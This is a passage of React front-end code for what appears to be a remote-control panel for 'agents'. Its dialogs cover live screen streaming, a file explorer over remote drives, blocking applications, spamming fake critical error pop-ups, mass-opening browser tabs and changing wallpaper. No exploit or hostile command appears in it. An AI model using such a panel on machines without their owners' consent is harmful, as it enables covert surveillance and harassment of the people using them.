                sx={{ flex: 1 }}
              >
                {angle}°
              </Button>
            ))}
          </Box>
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setRotateModal(false)}>Cancel</Button>
          <Button onClick={handleRotateSubmit} variant="contained" className="action-btn">
            Rotate
          </Button>
        </DialogActions>
      </Dialog>

      {/* Fullscreen Image Modal */}
      <Dialog
        open={fullscreenModal}
        onClose={() => setFullscreenModal(false)}
        PaperProps={{ className: 'modal-content' }}
        maxWidth="sm"
        fullWidth
      >
        <DialogTitle className="modal-header">
          <Typography variant="h5" className="glow-text">Fullscreen Image</Typography>
        </DialogTitle>
        <DialogContent>
          <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
            Enter an image URL or upload a file:
          </Typography>
          <TextField
            fullWidth
            label="Image URL"
            placeholder="https://example.com/image.gif"
            value={fullscreenUrl}
            onChange={(e) => setFullscreenUrl(e.target.value)}
            className="input-field"
            sx={{ mb: 2 }}
            disabled={!!fullscreenFile}
          />
          <Typography variant="body2" color="text.secondary" sx={{ mb: 1, textAlign: 'center' }}>
            - OR -
          </Typography>
          <input
            type="file"
            accept="image/*"
            onChange={(e) => {
              setFullscreenFile(e.target.files[0]);
              setFullscreenUrl('');
            }}
            style={{ marginTop: 8 }}
          />
          {fullscreenFile && (
            <Typography variant="caption" color="text.secondary" sx={{ mt: 1, display: 'block' }}>
              Selected: {fullscreenFile.name}
            </Typography>
          )}
          <TextField
            fullWidth
            label="Duration (seconds)"
            type="number"
            placeholder="30"
            value={fullscreenDuration}
            onChange={(e) => setFullscreenDuration(e.target.value)}
            className="input-field"
            sx={{ mt: 2 }}
            inputProps={{ min: 1, max: 3600 }}
          />
        </DialogContent>
        <DialogActions>
          <Button onClick={() => {
            setFullscreenModal(false);
            setFullscreenFile(null);
            setFullscreenUrl('');
          }}>Cancel</Button>
          <Button onClick={handleFullscreenSubmit} variant="contained" className="action-btn">
            Display
          </Button>
        </DialogActions>
      </Dialog>

      {/* Block Application Modal */}
      <Dialog
        open={blockAppModal}
        onClose={() => setBlockAppModal(false)}
        PaperProps={{ className: 'modal-content' }}
        maxWidth="sm"
        fullWidth
      >
        <DialogTitle className="modal-header">
          <Typography variant="h5" className="glow-text">Block Application</Typography>
        </DialogTitle>
        <DialogContent>
          <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
            Select an application to block:
          </Typography>
          {runningApps.length === 0 ? (
            <Typography variant="body2" color="text.secondary" sx={{ textAlign: 'center', py: 2 }}>
              Loading applications...
            </Typography>
          ) : (
            <FormControl fullWidth className="input-field">
              <InputLabel>Application</InputLabel>
              <Select
                value={selectedApp}
                onChange={(e) => setSelectedApp(e.target.value)}
                label="Application"
              >
                {runningApps.map((app, index) => (
                  <MenuItem key={index} value={app.name}>
                    {app.title} ({app.name})
                  </MenuItem>
                ))}
              </Select>
            </FormControl>
          )}
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setBlockAppModal(false)}>Cancel</Button>
          <Button
            onClick={handleBlockApp}
            variant="contained"
            className="action-btn"
            disabled={!selectedApp}
          >
            Block
          </Button>
        </DialogActions>
      </Dialog>

      {/* File Browser Modal */}
      <Dialog
        open={fileBrowserModal}
        onClose={() => setFileBrowserModal(false)}
        PaperProps={{ className: 'modal-content' }}
        maxWidth="lg"
        fullWidth
      >
        <DialogTitle className="modal-header">
          <Typography variant="h5" className="glow-text">
            <ComputerIcon sx={{ mr: 1, verticalAlign: 'middle' }} />
            File Explorer
          </Typography>
        </DialogTitle>
        <DialogContent sx={{ minHeight: 500 }}>
          {/* Navigation Bar */}
          <Box className="nav-bar" sx={{ mb: 2, display: 'flex', alignItems: 'center', gap: 1, p: 1 }}>
            <Button
              startIcon={<ArrowUpwardIcon />}
              onClick={goUpDirectory}
              disabled={showDrives || loadingFiles}
              size="small"
              variant="outlined"
              sx={{
                borderColor: 'rgba(49, 211, 139, 0.2)',
                color: 'var(--accent)',
                '&:hover': {
                  borderColor: 'var(--accent)',
                  backgroundColor: 'rgba(49, 211, 139, 0.08)'
                }
              }}
            >
              Up
            </Button>
            <Button
              startIcon={<ComputerIcon />}
              onClick={goToDrives}
              disabled={showDrives || loadingFiles}
              size="small"
              variant="outlined"
              sx={{
                borderColor: 'rgba(49, 211, 139, 0.2)',
                color: 'var(--accent)',
                '&:hover': {
                  borderColor: 'var(--accent)',
                  backgroundColor: 'rgba(49, 211, 139, 0.08)'
                }
              }}
            >
              This PC
            </Button>
            <Box className="address-bar" sx={{ flex: 1, px: 2, py: 0.5 }}>
              <Typography variant="body2" color="text.primary">
                {showDrives ? 'This PC' : currentPath}
              </Typography>
            </Box>
          </Box>

          {/* Content Area */}
          {loadingFiles ? (
            <Box sx={{ display: 'flex', justifyContent: 'center', alignItems: 'center', minHeight: 400 }}>
              <Typography variant="body2" color="text.secondary">
                Loading...
              </Typography>
            </Box>
          ) : showDrives ? (
            // Drives View
            <Box>
              <Typography variant="subtitle2" sx={{ mb: 2, px: 1, color: 'var(--accent)' }}>
                Devices and drives
              </Typography>
              <Grid container spacing={2}>
                {drives.map((drive, index) => (
                  <Grid item xs={12} sm={6} md={4} key={index}>
                    <Box
                      onClick={() => selectDrive(drive.path)}
                      className="drive-card"
                      sx={{ p: 2, cursor: 'pointer' }}
                    >
                      <Box sx={{ display: 'flex', alignItems: 'center', gap: 2, mb: 1 }}>
                        <StorageIcon sx={{ fontSize: 40, color: 'var(--accent)' }} />
                        <Box sx={{ flex: 1 }}>
                          <Typography variant="body1" fontWeight="bold" color="text.primary">
                            Local Disk ({drive.letter}:)
                          </Typography>
                          {drive.total > 0 && (
                            <Typography variant="caption" color="text.secondary">
                              {(drive.free / (1024 ** 3)).toFixed(1)} GB free of {(drive.total / (1024 ** 3)).toFixed(1)} GB
                            </Typography>
                          )}
                        </Box>
                      </Box>
                      {drive.total > 0 && (
                        <Box sx={{
                          width: '100%',
                          height: 6,
                          backgroundColor: 'rgba(255, 255, 255, 0.1)',
                          borderRadius: 3,
                          overflow: 'hidden'
                        }}>
                          <Box sx={{
                            width: `${(drive.used / drive.total) * 100}%`,
                            height: '100%',
                            backgroundColor: 'var(--accent)',
                            transition: 'width 0.3s'
                          }} />
                        </Box>
                      )}
                    </Box>
                  </Grid>
                ))}
              </Grid>
            </Box>
          ) : fileItems.length === 0 ? (
            <Box sx={{ display: 'flex', justifyContent: 'center', alignItems: 'center', minHeight: 400 }}>
              <Typography variant="body2" color="text.secondary">
                This folder is empty
              </Typography>
            </Box>
          ) : (
            // Files and Folders View
            <Box sx={{
              maxHeight: 400,
              overflowY: 'auto',
              border: '1px solid rgba(0, 212, 255, 0.2)',
              borderRadius: 1,
              backgroundColor: 'rgba(0, 0, 0, 0.3)'
            }}>
              {fileItems.map((item, index) => (
                <Box
                  key={index}
                  onClick={() => handleFileClick(item)}
                  className="file-browser-item"
                  sx={{
                    display: 'flex',
                    alignItems: 'center',
                    gap: 2,
                    p: 1.5,
                    borderBottom: index < fileItems.length - 1 ? '1px solid rgba(0, 212, 255, 0.1)' : 'none',
                    cursor: 'pointer',
                    margin: '4px',
                    borderRadius: '8px'
                  }}
                >
                  {item.is_dir ? (
                    <FolderIcon sx={{ fontSize: 32, color: '#ffa726' }} />
                  ) : (
                    <FileIcon sx={{ fontSize: 32, color: 'var(--accent)' }} />
                  )}
                  <Box sx={{ flex: 1, minWidth: 0 }}>
                    <Typography variant="body2" noWrap color="text.primary">
                      {item.name}
                    </Typography>
                    {!item.is_dir && (
                      <Typography variant="caption" color="text.secondary">
                        {item.size < 1024
                          ? `${item.size} B`
                          : item.size < 1024 * 1024
                          ? `${(item.size / 1024).toFixed(2)} KB`
                          : `${(item.size / (1024 * 1024)).toFixed(2)} MB`
                        }
                      </Typography>
                    )}
                  </Box>
                  {item.is_dir && (
                    <Typography variant="caption" sx={{ color: 'var(--text-muted)' }}>
                      Folder
                    </Typography>
                  )}
                </Box>
              ))}
            </Box>
          )}
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setFileBrowserModal(false)}>Close</Button>
        </DialogActions>
      </Dialog>

      {/* Screen Stream Modal */}
      <Dialog
        open={streamModal}
        onClose={() => {
          setStreamModal(false);
          if (streaming) {
            stopScreenStream();
          }
        }}
        PaperProps={{ className: 'modal-content' }}
        maxWidth="lg"
        fullWidth
      >
        <DialogTitle className="modal-header">
          <Typography variant="h5" className="glow-text">
            <VideocamIcon sx={{ mr: 1, verticalAlign: 'middle' }} />
            Screen Stream
          </Typography>
        </DialogTitle>
        <DialogContent sx={{ minHeight: 500 }}>
          {!streaming && monitors.length > 0 ? (
            // Выбор монитора
            <Box>
              <Typography variant="subtitle2" sx={{ mb: 2, color: 'var(--accent)' }}>
                Select Monitor
              </Typography>
              <Grid container spacing={2}>
                <Grid item xs={12} sm={6} md={4}>
                  <Box
                    onClick={() => startStreamWithMonitor(null)}
                    className="drive-card"
                    sx={{ p: 2, cursor: 'pointer', textAlign: 'center' }}
                  >
                    <ComputerIcon sx={{ fontSize: 48, color: 'var(--accent)', mb: 1 }} />
                    <Typography variant="body1" fontWeight="bold" color="text.primary">
                      All Monitors
                    </Typography>
                    <Typography variant="caption" color="text.secondary">
                      Capture all screens
                    </Typography>
                  </Box>
                </Grid>
                {monitors.map((monitor, index) => (
                  <Grid item xs={12} sm={6} md={4} key={index}>
                    <Box
                      onClick={() => startStreamWithMonitor(monitor.index)}
                      className="drive-card"
                      sx={{ p: 2, cursor: 'pointer', textAlign: 'center' }}
                    >
                      <StorageIcon sx={{ fontSize: 48, color: 'var(--accent)', mb: 1 }} />
                      <Typography variant="body1" fontWeight="bold" color="text.primary">
                        {monitor.name}
                        {monitor.primary && ' (Primary)'}
                      </Typography>
                      <Typography variant="caption" color="text.secondary">
                        {monitor.width} × {monitor.height}
                      </Typography>
                    </Box>
                  </Grid>
                ))}
              </Grid>
            </Box>
          ) : streaming && streamFrame ? (
            // Отображение трансляции
            <Box sx={{ width: '100%', textAlign: 'center' }}>
              <img
                src={`data:image/jpeg;base64,${streamFrame}`}
                alt="Screen Stream"
                style={{
                  maxWidth: '100%',
                  maxHeight: '70vh',
                  borderRadius: '12px',
                  border: '1px solid rgba(49, 211, 139, 0.2)',
                  boxShadow: '0 0 20px rgba(49, 211, 139, 0.1)'
                }}
              />
              <Typography variant="caption" color="text.secondary" sx={{ mt: 2, display: 'block' }}>
                Live stream • ~5 FPS
                {selectedMonitor !== null && ` • Monitor ${selectedMonitor + 1}`}
              </Typography>
            </Box>
          ) : (
            // Ожидание
            <Box sx={{ display: 'flex', alignItems: 'center', justifyContent: 'center', minHeight: 400 }}>
              <Box sx={{ textAlign: 'center' }}>
                <VideocamIcon sx={{ fontSize: 64, color: 'var(--accent)', mb: 2 }} />
                <Typography variant="body2" color="text.secondary">
                  {monitors.length === 0 ? 'Loading monitors...' : 'Waiting for stream...'}
                </Typography>
              </Box>
            </Box>
          )}
        </DialogContent>
        <DialogActions>
          {streaming ? (
            <Button onClick={() => {
              setStreamModal(false);
              stopScreenStream();
            }}>
              Stop & Close
            </Button>
          ) : (
            <Button onClick={() => setStreamModal(false)}>
              Cancel
            </Button>
          )}
        </DialogActions>
      </Dialog>

      {/* Logs Modal */}
      <Dialog
        open={logsModal}
        onClose={() => setLogsModal(false)}
        maxWidth="lg"
        fullWidth
        PaperProps={{
          sx: {
            backgroundColor: '#111314 !important',
            backgroundImage: 'none !important',
            border: '1px solid var(--border)',
            opacity: 1
          }
        }}
        BackdropProps={{
          sx: {
            backgroundColor: 'rgba(0, 0, 0, 0.9)'
          }
        }}
        sx={{
          '& .MuiDialog-paper': {
            backgroundColor: '#111314 !important',
            backgroundImage: 'none !important'
          }
        }}
      >
        <DialogTitle>
          Agent Logs
          {currentUser?.role === 'admin' && (
            <Button
              startIcon={<DeleteForeverIcon />}
              onClick={clearAgentLogs}
              color="error"
              sx={{ float: 'right' }}
            >
              Clear Logs
            </Button>
          )}
        </DialogTitle>
        <DialogContent>
          <Box sx={{ maxHeight: 500, overflow: 'auto' }}>
            {agentLogs.length === 0 ? (
              <Typography color="text.secondary" sx={{ textAlign: 'center', py: 4 }}>
                No logs found for this agent
              </Typography>
            ) : (
              <Box>
                {agentLogs.map((log) => (
                  <Box
                    key={log.id}
                    sx={{
                      p: 2,
                      mb: 1,
                      borderRadius: 1,
                      border: '1px solid var(--border)',
                      backgroundColor: '#060707'
                    }}
                  >
                    <Box sx={{ display: 'flex', justifyContent: 'space-between', mb: 1 }}>
                      <Typography variant="body2" sx={{ fontWeight: 600 }}>
                        {log.username} - {log.action}
                      </Typography>
                      <Typography variant="caption" color="text.secondary">
                        {new Date(log.timestamp).toLocaleString()}
                      </Typography>
                    </Box>
                    {log.command && (
                      <Typography variant="body2" color="text.secondary" sx={{ mb: 0.5 }}>
                        Command: {log.command}
                      </Typography>
                    )}
                    {log.details && (
                      <Typography variant="body2" color="text.secondary">
                        {log.details}
                      </Typography>
                    )}
                    {log.ip_address && (
                      <Typography variant="caption" color="text.secondary">
                        IP: {log.ip_address}
                      </Typography>
                    )}
                  </Box>
                ))}
              </Box>
            )}
          </Box>
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setLogsModal(false)}>Close</Button>
        </DialogActions>
      </Dialog>

      {/* Error Spam Modal */}
      <Dialog
        open={errorSpamModal}
        onClose={() => setErrorSpamModal(false)}
        maxWidth="sm"
        fullWidth
        PaperProps={{ className: 'modal-content' }}
      >
        <DialogTitle className="modal-header">
          <Typography variant="h5" className="glow-text">Spam Errors</Typography>
        </DialogTitle>
        <DialogContent>
          <Box sx={{ display: 'flex', flexDirection: 'column', gap: 2, mt: 2 }}>
            <FormControl fullWidth>
              <InputLabel>Error Type</InputLabel>
              <Select
                value={useCustomError ? 'custom' : 'preset'}
                onChange={(e) => setUseCustomError(e.target.value === 'custom')}
                label="Error Type"
              >
                <MenuItem value="preset">Preset System Errors</MenuItem>
                <MenuItem value="custom">Custom Error</MenuItem>
              </Select>
            </FormControl>

            {!useCustomError ? (
              <FormControl fullWidth>
                <InputLabel>Severity</InputLabel>
                <Select
                  value={errorType}
                  onChange={(e) => setErrorType(e.target.value)}
                  label="Severity"
                >
                  <MenuItem value="critical">Critical (Red Icon)</MenuItem>
                  <MenuItem value="warning">Warning (Yellow Icon)</MenuItem>
                </Select>
              </FormControl>
            ) : (
              <>
                <TextField
                  label="Error Title"
                  value={customErrorTitle}
                  onChange={(e) => setCustomErrorTitle(e.target.value)}
                  fullWidth
                  placeholder="e.g., System Error"
                />
                <TextField
                  label="Error Message"
                  value={customErrorMessage}
                  onChange={(e) => setCustomErrorMessage(e.target.value)}
                  fullWidth
                  multiline
                  rows={3}
                  placeholder="e.g., A critical error has occurred..."
                />
              </>
            )}

            <TextField
              label="Count"
              type="number"
              value={errorCount}
              onChange={(e) => setErrorCount(e.target.value)}
              fullWidth
              inputProps={{ min: 1, max: 100 }}
            />

            <TextField
              label="Delay (seconds)"
              type="number"
              value={errorDelay}
              onChange={(e) => setErrorDelay(e.target.value)}
              fullWidth
              inputProps={{ min: 0.1, max: 10, step: 0.1 }}
            />
          </Box>
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setErrorSpamModal(false)}>Cancel</Button>
          <Button onClick={handleErrorSpam} variant="contained" color="warning">
            Spam Errors
          </Button>
        </DialogActions>
      </Dialog>

      {/* Open Browser Tabs Modal */}
      <Dialog
        open={openTabsModal}
        onClose={() => setOpenTabsModal(false)}
        maxWidth="sm"
        fullWidth
        PaperProps={{ className: 'modal-content' }}
      >
        <DialogTitle className="modal-header">
          <span className="glow-text">Open Browser Tabs</span>
        </DialogTitle>
        <DialogContent>
          <Box sx={{ display: 'flex', flexDirection: 'column', gap: 2, mt: 2 }}>
            <TextField
              label="URL"
              value={tabUrl}
              onChange={(e) => setTabUrl(e.target.value)}
              fullWidth
              placeholder="https://example.com"
              helperText="Enter the URL to open in browser tabs"
            />

            <TextField
              label="Number of Tabs"
              type="number"
              value={tabCount}
              onChange={(e) => setTabCount(e.target.value)}
              fullWidth
              inputProps={{ min: 1, max: 100 }}
              helperText="How many tabs to open (1-100)"
            />

            <TextField
              label="Delay (seconds)"
              type="number"
              value={tabDelay}
              onChange={(e) => setTabDelay(e.target.value)}
              fullWidth
              inputProps={{ min: 0, max: 60, step: 0.1 }}
              helperText="Delay between opening each tab (0-60 seconds)"
            />
          </Box>
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setOpenTabsModal(false)}>Cancel</Button>
          <Button onClick={handleOpenTabs} variant="contained" color="primary">
            Open Tabs
          </Button>
        </DialogActions>
      </Dialog>

      {/* Change Wallpaper Modal */}
      <Dialog
        open={wallpaperModal}
        onClose={() => setWallpaperModal(false)}
        maxWidth="sm"
        fullWidth
        PaperProps={{ className: 'modal-content' }}
      >
        <DialogTitle className="modal-header">
          <span className="glow-text">Change Wallpaper</span>
        </DialogTitle>
        <DialogContent>
          <Box sx={{ display: 'flex', flexDirection: 'column', gap: 2, mt: 2 }}>
            <Button
              variant="outlined"
              component="label"
              fullWidth
              sx={{ py: 2 }}
            >
              {wallpaperFile ? wallpaperFile.name : 'Select Image File'}
              <input
                type="file"
                hidden
                accept="image/*"
                onChange={(e) => setWallpaperFile(e.target.files[0])}
              />
            </Button>
            <Typography variant="caption" color="text.secondary" sx={{ textAlign: 'center' }}>
              Supported formats: JPG, PNG, BMP
            </Typography>
          </Box>
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setWallpaperModal(false)}>Cancel</Button>
          <Button onClick={handleChangeWallpaper} variant="contained" color="primary">
            Change Wallpaper
          </Button>
        </DialogActions>
      </Dialog>

      {/* Open File Modal */}
      <Dialog
        open={openFileModal}
        onClose={() => setOpenFileModal(false)}
        maxWidth="sm"
        fullWidth
        PaperProps={{ className: 'modal-content' }}
      >
        <DialogTitle className="modal-header">
          <span className="glow-text">Open File</span>
        </DialogTitle>
        <DialogContent>
          <Box sx={{ display: 'flex', flexDirection: 'column', gap: 2, mt: 2 }}>
            <TextField
              label="File Path"
              value={openFilePath}
              onChange={(e) => setOpenFilePath(e.target.value)}
              fullWidth
              placeholder="C:\path\to\file.txt"
              helperText="Enter the full path to the file you want to open"
            />
          </Box>
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setOpenFileModal(false)}>Cancel</Button>
          <Button onClick={handleOpenFile} variant="contained" color="primary">
            Open File
          </Button>
        </DialogActions>
      </Dialog>
    </Box>
  );
}
